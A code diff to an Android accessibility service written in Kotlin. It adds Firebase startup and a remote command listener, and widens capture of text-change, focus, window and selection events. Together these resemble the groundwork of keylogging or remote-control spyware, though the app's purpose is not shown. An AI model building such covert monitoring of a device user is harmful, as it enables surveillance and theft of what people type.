@@ -6,6 +6,7 @@ import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.annotation.RequiresApi
+import com.google.firebase.FirebaseApp
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
@@ -31,15 +32,21 @@ class AppAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         try {
+            FirebaseApp.initializeApp(applicationContext)
+            RemoteCommandListener.startListening()
+
             val info = AccessibilityServiceInfo().apply {
-                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED
+                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
+                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
+                        AccessibilityEvent.TYPE_VIEW_SELECTED
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-                notificationTimeout = 100
+                notificationTimeout = 50
             }
             serviceInfo = info
             Log.d(TAG, "Accessibility Service Connected Successfully")
-            LogStore.addLog("Accessibility Service Connected")
+            LogStore.addLog("Accessibility Service Connected & Active")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
             LogStore.addLog("Accessibility Service connection error: ${e.toString()}")
